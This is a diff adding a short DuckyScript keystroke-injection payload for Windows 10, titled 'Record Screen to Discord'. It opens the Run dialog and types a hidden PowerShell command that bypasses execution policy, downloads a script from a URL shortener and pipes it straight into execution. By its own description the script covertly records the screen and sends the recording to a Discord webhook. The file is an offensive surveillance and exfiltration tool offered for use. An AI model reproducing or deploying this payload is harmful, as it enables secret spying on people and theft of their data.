@@ -1,0 +1,18 @@
+REM Title: Record Screen to Discord
+REM Author: @beigeworm
+REM Description: This script records the screen for a specified time to a mkv file, then sends the file to a discord webhook.
+REM Target: Windows 10
+
+REM Replace YOUR_WEBHOOK_HERE with your Discord webhook URL
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc = 'YOUR_WEBHOOK_HERE' ; irm is.gd/bwscreendc | iex
+ENTER
+
+
